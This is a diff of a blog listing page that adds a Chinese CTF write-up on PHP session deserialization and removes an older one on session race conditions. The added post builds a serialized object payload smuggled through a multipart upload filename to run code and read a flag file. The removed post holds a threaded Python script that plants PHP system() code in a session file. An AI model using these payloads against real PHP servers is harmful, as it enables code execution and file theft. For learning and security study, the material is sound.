@@ -169,6 +169,162 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-session反序列化漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/09/21/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="article-date">
+  	<time datetime="2021-09-20T16:00:00.000Z" itemprop="datePublished">2021-09-21</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/21/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+        session反序列化漏洞
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="session反序列化漏洞"><a href="#session反序列化漏洞" class="headerlink" title="session反序列化漏洞"></a>session反序列化漏洞</h1><h2 id="session的定义"><a href="#session的定义" class="headerlink" title="session的定义"></a>session的定义</h2><p>session对象在网络应用中叫做会话控制，它会存储特定用户会话所需的属性以及配置信息，而当用户在应用程序的web页面跳转时，session对象中的变量会在整个用户会话中一直存在下去，如果此时该用户没有会话的话，服务器就会自动创建一个session对象，当会话过期或被放弃时，服务器将会终止该会话</p>
+<h2 id="session作用原理"><a href="#session作用原理" class="headerlink" title="session作用原理"></a>session作用原理</h2><p>当第一次访问网站的时候，Session_start()函数会创建一个唯一的Session ID，并会通过http响应头，将这个Session ID保存在客户端Cookie中，同时也会在服务器端创建一个以Session ID命名的文件，保存这个用户对话信息，当用户再次访问这个网站时，也会自动通过http请求头将cookie中保存的Session ID携带过来，此时Session_start()函数不会再分配新的Session ID，而是会在服务器的硬盘中寻找和Session ID同名的Session文件，将之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪用户的目的</p>
+<h3 id="session-start"><a href="#session-start" class="headerlink" title="session_start()"></a>session_start()</h3><p>当会话自动开始或者通过session_start()手动开始时，PHPSESSID会获取现有的对应的会话数据(即session文件)，PHP会自动反序列化session文件的内容，并将其填充在$_SESSION超级全局变量中，如果不存在对应的会话数据，则会创建名为sess_PHPSESSID(客户端传来的)的文件，如果客户端未发送PHPSESSID，则会创建一个由32个字母组成的PHPSESSID，并返回set-cookie。</p>
+<p>因此，上面有一个漏洞，就是可以利用上传一个PHPSESSID，但是在服务器端不存在对应的会话数据，所以会在特定的路径生成sess_PHPSESSID文件，然后我们可以加入恶意代码，然后包含这个服务端的文件，即可达到执行恶意代码的目的，而由于它会判断文件是否为恶意文件，是则删除，所以我们要在判断的间隙进行包含，这就叫做session条件竞争</p>
+<p>在Linux系统中php-session存放的位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php5/sess_PHPSESSID</span><br><span class="line">/var/lib/php7/sess_PHPSESSID</span><br><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSED</span><br></pre></td></tr></table></figure>
+<p>在php.ini中的一些Session配置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">session.save_path=&quot;&quot; --设置session的存储路径</span><br><span class="line">session.save_handler=&quot;&quot;--设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</span><br><span class="line">session.auto_start boolen--指定会话模块是否在请求开始时启动一个会话默认为0不启动</span><br><span class="line">session.serialize_handler string--定义用来序列化/反序列化的处理器名字。默认使用php</span><br></pre></td></tr></table></figure>
+<h3 id="session机制对序列化的处理方式"><a href="#session机制对序列化的处理方式" class="headerlink" title="session机制对序列化的处理方式"></a>session机制对序列化的处理方式</h3><p>不同处理器对应的存储格式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php对应的存储格式：键名+竖线+经过serialize()函数反序列化处理的值</span><br><span class="line"></span><br><span class="line">php_binary对应的存储格式：键名的长度对应的ascii字符+键名+经过serialize()函数反序列化处理的值</span><br><span class="line"></span><br><span class="line">php_serialize对应的存储格式：经过serialize()函数反序列化处理的数组</span><br></pre></td></tr></table></figure>
+<p>实例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php : lemon|s:3:&quot;shy&quot;;</span><br><span class="line"></span><br><span class="line">php_serialize : a:1:&#123;s:5:&quot;lemon&quot;;s:3:&quot;shy&quot;;&#125;</span><br><span class="line"></span><br><span class="line">php_binary : lemons:3:&quot;shy&quot;;</span><br></pre></td></tr></table></figure>
+
+<h3 id="session反序列化漏洞的原理"><a href="#session反序列化漏洞的原理" class="headerlink" title="session反序列化漏洞的原理"></a>session反序列化漏洞的原理</h3><p>当使用两个引擎来分别处理序列化和反序列化时，由于php引擎的存储格式为：键名 | serialized_string，而php_serialize引擎的存储格式为：serialized_string，此时就会出问题</p>
+<p>php_serialize的格式存储的文件（序列化）<br>1.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;session.serialize_handler&quot;,&quot;php_serialize&quot;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;lemon&#x27;]=$_GET[&#x27;a&#x27;];</span><br><span class="line">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>php引擎读取session文件（反序列化）<br>2.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;sesssion.serialize_handler&quot;,&quot;php&quot;);</span><br><span class="line">session_start();</span><br><span class="line">class student&#123;</span><br><span class="line">	var $name;</span><br><span class="line">	var $age;</span><br><span class="line">	function __wakeup()&#123;</span><br><span class="line">		echo &quot;hello&quot;.$this-&gt;name.&quot;!&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>首先访问1.php，在传入的参数最开始加一个’|‘,由于1.php使用的是php_serialize引擎处理，所以只会将’|‘当作是一个正常的字符，然后访问2.php时，用的是php引擎，因此遇到’|‘时会将它看作是键名与值得分割符，从而造成漏洞，因为在解析session时会直接对’|‘后得值进行反序列化处理</p>
+<p>在解析session时会直接对’|‘后得值进行反序列化处理的原因是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">session_start()会通过read回调函数返回的现有会话数据(使用特殊的序列化格式存储)，php会自动反序列化数据并且填充$_SESSION超级全局变量，而如果没有$_SESSION超级全局变量时，我们可以利用php中存在的upload_progress机制，即自动在$_SESSION中创建一个键值对，值中存在用户可控的部分</span><br><span class="line"></span><br><span class="line">步骤就是</span><br></pre></td></tr></table></figure>
+<p>上传文件，同时post一个与session.upload.name的同名变量，后端就会自动将POST的这个同名变量作为键进行序列化然后存储在session文件中，下次请求就会反序列化session文件，从而取出这个键</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">## 题目实例</span><br><span class="line"></span><br><span class="line">题目地址：http://web.jarvisoj.com:32784/index.php</span><br><span class="line"></span><br><span class="line">打开页面，我们可以看见代码</span><br></pre></td></tr></table></figure>
+<?php
+//A webshell is wait for you
+ini_set('session.serialize_handler', 'php');
+session_start();
+class OowoO
+{
+    public $mdzz;
+    function __construct()
+    {
+        $this->mdzz = 'phpinfo();';
+    }
+    
+    function __destruct()
+    {
+        eval($this->mdzz);
+    }
+}
+if(isset($_GET['phpinfo']))
+{
+    $m = new OowoO();
+}
+else
+{
+    highlight_string(file_get_contents('index.php'));
+}
+?>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">看见这串代码</span><br></pre></td></tr></table></figure>
+<p>ini_set(‘session.serialize_handler’, ‘php’);</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们可以猜测是session反序列化漏洞，我们可以构造</span><br></pre></td></tr></table></figure>
+<p>?phpinfo=sd</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">可以看见php版本信息，发现session.serialize_handler默认是php_serialize，但是题目使用的是php，所以我们更加确信可以使用session反序列化漏洞，但是在php版本中发现没有$_SESSION超级全局变量，所以我们利用php中的upload_progress机制，随便上传一个文件上去</span><br><span class="line">shell.html</span><br></pre></td></tr></table></figure>
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <title>Title</title>
+    </head>
+    <body>
+        <form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data">
+            <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="2333" />
+            <input type="file" name="file" />
+            <input type="submit" value="上传" />
+        </form>
+    </body>
+</html>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后我们用exp</span><br></pre></td></tr></table></figure>
+<?php
+session_start();
+
+class OowoO
+{    public $mdzz="print_r(scandir(dirname(__FILE__)));";
+}
+$obj = new OowoO();
+echo serialize($obj);
+?>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">来读取列目录</span><br><span class="line">由于disable_function限制了许多的系统函数，所以可以使用print_r(scandir(dirname(__FILE__)));</span><br><span class="line"></span><br><span class="line">然后对生成的序列化的数据中的双引号加上反斜杠\，来防止被转义，然后按照php引擎存储的格式加上|</span><br></pre></td></tr></table></figure>
+<p>|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(<strong>FILE</strong>)));&quot;;}</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">然后将序列化数据放进filename变量中</span><br></pre></td></tr></table></figure>
+<p>POST /index.php HTTP/1.1<br>Host: web.jarvisoj.com:32784<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Content-Type: multipart/form-data; boundary=—————————141584464441786179722796804373<br>Content-Length: 492<br>Connection: close<br>Cookie: PHPSESSID=muj965sc623533fu7g566as841<br>Upgrade-Insecure-Requests: 1</p>
+<p>—————————–141584464441786179722796804373<br>Content-Disposition: form-data; name=”PHP_SESSION_UPLOAD_PROGRESS”</p>
+<p>2333<br>—————————–141584464441786179722796804373<br>Content-Disposition: form-data; name=”file”; filename=”|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(<strong>FILE</strong>)));&quot;;}<br>“<br>Content-Type: text/plain</p>
+<p>You Find it in GET fileName=xk0SzyKwfzw.php and param=Efa5BVG</p>
+<p>—————————–141584464441786179722796804373–</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">即可看见列目录文件</span><br></pre></td></tr></table></figure>
+<p></code>Array<br>(<br>    [0] =&gt; .<br>    [1] =&gt; ..<br>    [2] =&gt; Here_1s_7he_fl4g_buT_You_Cannot_see.php<br>    [3] =&gt; index.php<br>    [4] =&gt; phpinfo.php<br>)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后我们可以使用file_get_contents()函数来读取我们想读的文件</span><br></pre></td></tr></table></figure>
+<p>|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:88:&quot;print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));&quot;;}</p>
+<pre><code>可以得到flag
+
+参考文章：[https://blog.csdn.net/qq_43431158/article/details/99544797]
+
+    [https://mp.weixin.qq.com/s?__biz=MzAxNzkyOTgxMw==&amp;mid=2247487259&amp;idx=1&amp;sn=e70d97877c0f1a282cf56c6ad4e34d26&amp;chksm=9bdf4c21aca8c5372350a6fa309720a07542d74f61f537229f93927eec6ff5828d9794408571&amp;exptype=unsubscribed_card_3_article_onlinev2_1000w_promotion_level2&amp;expsessionid=2055871802941276160&amp;scene=169&amp;subscene=10000&amp;sessionid=1632156171&amp;clicktime=1632156172&amp;enterid=1632156172&amp;ascene=56&amp;devicetype=android-30&amp;version=28000b59&amp;nettype=cmnet&amp;abtest_cookie=AAACAA%3D%3D&amp;lang=zh_CN&amp;exportkey=A8U60hrCswzBIw4qx3LcHl4%3D&amp;pass_ticket=wgImpgfwefCQmznd1rg85X51CdNokjWKgG%2B1%2FN7vSYdFBa8eTAvqvC25RW7jJ3SP&amp;wx_header=1]
+</code></pre>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-不可见字符绕过" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1143,76 +1299,9 @@ $phar->setStub("<?php __HALT_COMPILER(); ?><p>“); //设置stub</p>
 
 
   
-    <article id="post-session条件竞争" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/09/12/session%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/" class="article-date">
-  	<time datetime="2021-09-11T16:00:00.000Z" itemprop="datePublished">2021-09-12</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/09/12/session%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">
-        session条件竞争
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="session条件竞争"><a href="#session条件竞争" class="headerlink" title="session条件竞争"></a>session条件竞争</h1><p>打开页面，看见源码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(&#x27;index.php&#x27;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">$gwht= $_GET[&quot;gwht&quot;];</span><br><span class="line">$ycb= $_GET[&quot;ycb&quot;];</span><br><span class="line">if(preg_match(&quot;/flag/&quot;,$gwht))&#123;</span><br><span class="line">    die(&#x27;hack&#x27; );</span><br><span class="line">&#125;</span><br><span class="line">if(preg_match(&quot;/secret/&quot;,$gwht))&#123;</span><br><span class="line">    die(&#x27;hack&#x27; );</span><br><span class="line">&#125;</span><br><span class="line">include($gwht);</span><br><span class="line">if(isset($ycb))&#123;</span><br><span class="line">    $url = parse_url($_SERVER[&#x27;REQUEST_URI&#x27;]);</span><br><span class="line">    echo $url[&#x27;query&#x27;];</span><br><span class="line">    parse_str($url[&#x27;query&#x27;],$query);</span><br><span class="line">    foreach($query as $value)&#123;</span><br><span class="line">        echo $value;</span><br><span class="line">        if (preg_match(&quot;/Flag/&quot;,$value)) &#123;</span><br><span class="line">            die(&#x27;not hit&#x27;);</span><br><span class="line">            exit();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    echo serialize($ycb);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;what are you doing&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>通过源码，我们可以看到有个include()函数可以给我们利用来读取文件，但它使用正则过滤，过滤掉了flag，所以我们可以使用data伪协议来构造php代码来读取，所以构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//?gwht=/var/lib/php5/sess_ph1</span><br></pre></td></tr></table></figure>
-<p>来读取目录信息，发现不行，经过本地测试发现是因为php默认allow_url_include=0，所以不可以使用data伪协议，但是我们可以使用session条件竞争来做，由于你上传的文件，会被服务器放在一个地方，然后进行判断文件是否有害，有害则被删除，但是如果时间太长的话，我们就可以利用这个时间间隙来访问文件，所以改了个exp</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import io</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">    </span><br><span class="line">sessid = &#x27;ph1&#x27;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">def t1(session):</span><br><span class="line">	while True:</span><br><span class="line">		f = io.BytesIO(b&#x27;a&#x27; * 1024 * 50)</span><br><span class="line">		response = session.post(</span><br><span class="line">			&#x27;http://192.168.39.219:8000/&#x27;,</span><br><span class="line">			data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php system(&quot;cat /flag&quot;);?&gt;&#x27;&#125;,</span><br><span class="line">			files=&#123;&#x27;file&#x27;: (&#x27;a.txt&#x27;, f)&#125;,</span><br><span class="line">			cookies=&#123;&#x27;PHPSESSID&#x27;: sessid&#125;</span><br><span class="line">		)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">def t2(session):</span><br><span class="line">	while True:</span><br><span class="line">		response = session.get(f&#x27;http://192.168.39.219:8000//?gwht=/var/lib/php5/sess_&#123;sessid&#125;&#x27;)</span><br><span class="line">		print(response.text)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">with requests.session() as session:</span><br><span class="line">	t1 = threading.Thread(target=t1, args=(session, ))</span><br><span class="line">	t1.daemon = True</span><br><span class="line">	t1.start()</span><br><span class="line"></span><br><span class="line">	t2(session)</span><br></pre></td></tr></table></figure>
-<p>如果用命令行看返回结果的话，有点麻烦，所以我们直接在页面，通过它给的include()函数来包含上传文件，所以构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//?gwht=/var/lib/php5/sess_ph1</span><br></pre></td></tr></table></figure>
-<p>然后不断刷新，来包含sess_ph1文件，从而读取flag</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/4/">Next &amp;raquo;</a>
+      <a class="extend prev" rel="prev" href="/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><a class="extend next" rel="next" href="/page/4/">Next &amp;raquo;</a>
     </nav>
   
 </div>
